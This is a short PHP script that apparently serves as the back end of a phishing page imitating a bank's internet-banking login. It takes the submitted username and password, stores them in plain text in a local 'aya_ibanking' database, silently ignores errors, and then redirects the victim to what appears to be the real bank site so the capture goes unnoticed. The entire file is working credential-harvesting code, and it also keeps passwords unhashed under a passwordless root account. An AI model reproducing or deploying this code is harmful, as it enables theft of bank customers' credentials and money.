<?php
$user_name = $_POST['txtUser'];
$user_pass = $_POST['txtPass'];

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "aya_ibanking";


try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    // set the PDO error mode to exception
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // prepare sql and bind parameters
    $stmt = $conn->prepare("INSERT INTO users (name, pass)
    VALUES (:name, :pass)");
    $stmt->bindParam(':name', $user_name);
    $stmt->bindParam(':pass', $user_pass);
    $stmt->execute();
    }
catch(PDOException $e)
    {
    }
$conn = null;
header("location:https://www.ayaibanking.com/");
?>